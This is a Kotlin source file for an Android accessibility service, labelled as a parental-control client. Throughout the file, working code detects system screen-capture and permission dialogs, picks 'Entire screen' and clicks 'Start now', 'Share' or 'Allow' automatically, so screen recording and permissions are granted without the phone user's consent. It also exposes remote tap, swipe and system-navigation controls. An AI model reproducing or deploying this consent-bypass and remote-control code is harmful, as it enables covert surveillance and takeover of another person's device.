package com.parentalcontrolclient

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.view.accessibility.AccessibilityEvent

import android.view.accessibility.AccessibilityNodeInfo

class RemoteControlService : AccessibilityService() {

  override fun onServiceConnected() {
    super.onServiceConnected()
    instance = this
  }

  override fun onAccessibilityEvent(event: AccessibilityEvent?) {
    if (event == null) return
    try {
      val packageName = event.packageName?.toString() ?: ""
      if (packageName.contains("systemui") ||
          packageName.contains("projection") ||
          packageName.contains("permissioncontroller") ||
          packageName == "android") {
        val rootNode = rootInActiveWindow ?: return
        handleMediaProjectionDialog(rootNode)
      }
    } catch (e: Exception) {
      e.printStackTrace()
    }
  }

  private fun handleMediaProjectionDialog(node: AccessibilityNodeInfo?) {
    if (node == null) return

    // 1. Try to auto-select "Entire screen" if spinner / radio option exists
    selectEntireScreenOption(node)

    // 2. Try to auto-click the confirm button ("Start now", "Share screen", "Start recording", "Allow", "Share", button1)
    if (clickConfirmButton(node)) {
      return
    }

    // 3. Traversal of children
    for (i in 0 until node.childCount) {
      handleMediaProjectionDialog(node.getChild(i))
    }
  }

  private fun selectEntireScreenOption(node: AccessibilityNodeInfo): Boolean {
    val text = node.text?.toString()?.lowercase() ?: ""
    val contentDescription = node.contentDescription?.toString()?.lowercase() ?: ""
    val viewId = node.viewIdResourceName?.lowercase() ?: ""

    // If node matches "entire screen" text and is clickable or checkable
    if (text.contains("entire screen") || contentDescription.contains("entire screen") || viewId.contains("entire_screen")) {
      if (performClickOrParent(node)) {
        return true
      }
    }

    for (i in 0 until node.childCount) {
      val child = node.getChild(i) ?: continue
      if (selectEntireScreenOption(child)) return true
    }
    return false
  }

  private fun clickConfirmButton(node: AccessibilityNodeInfo): Boolean {
    val text = node.text?.toString()?.lowercase() ?: ""
    val contentDescription = node.contentDescription?.toString()?.lowercase() ?: ""
    val viewId = node.viewIdResourceName?.lowercase() ?: ""

    val isConfirmTarget = text.contains("start now") ||
        text.contains("start recording") ||
        text.contains("share screen") ||
        (text.contains("share") && !text.contains("cancel")) ||
        (text.contains("allow") && !text.contains("don't")) ||
        contentDescription.contains("start now") ||
        contentDescription.contains("share screen") ||
        viewId.endsWith(":id/button1") ||
        viewId.contains("permission_allow_button") ||
        viewId.contains("button_start")

    if (isConfirmTarget) {
      if (performClickOrParent(node)) {
        return true
      }
    }

    for (i in 0 until node.childCount) {
      val child = node.getChild(i) ?: continue
      if (clickConfirmButton(child)) return true
    }
    return false
  }

  private fun performClickOrParent(node: AccessibilityNodeInfo): Boolean {
    var current: AccessibilityNodeInfo? = node
    while (current != null) {
      if (current.isClickable) {
        return current.performAction(AccessibilityNodeInfo.ACTION_CLICK)
      }
      current = current.parent
    }
    return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
  }

  override fun onInterrupt() {
    // No-op
  }

  override fun onDestroy() {
    instance = null
    super.onDestroy()
  }

  fun performTouch(x: Float, y: Float): Boolean {
    val path = Path().apply { moveTo(x, y) }
    val gesture = GestureDescription.Builder()
      .addStroke(GestureDescription.StrokeDescription(path, 0, TAP_DURATION_MS))
      .build()
    return dispatchGesture(gesture, null, null)
  }

  fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float, durationMs: Long): Boolean {
    val path = Path().apply {
      moveTo(x1, y1)
      lineTo(x2, y2)
    }
    val gesture = GestureDescription.Builder()
      .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
      .build()
    return dispatchGesture(gesture, null, null)
  }

  fun performLongPress(x: Float, y: Float, durationMs: Long = LONG_PRESS_DURATION_MS): Boolean {
    val path = Path().apply { moveTo(x, y) }
    val gesture = GestureDescription.Builder()
      .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
      .build()
    return dispatchGesture(gesture, null, null)
  }

  fun executeGlobalAction(action: Int): Boolean = performGlobalAction(action)

  companion object {
    @Volatile
    var instance: RemoteControlService? = null
      private set

    const val TAP_DURATION_MS = 100L
    const val LONG_PRESS_DURATION_MS = 500L

    // Global actions for remote control
    const val ACTION_HOME = GLOBAL_ACTION_HOME
    const val ACTION_BACK = GLOBAL_ACTION_BACK
    const val ACTION_RECENTS = GLOBAL_ACTION_RECENTS
    const val ACTION_NOTIFICATIONS = GLOBAL_ACTION_NOTIFICATIONS
    const val ACTION_QUICK_SETTINGS = GLOBAL_ACTION_QUICK_SETTINGS
  }
}
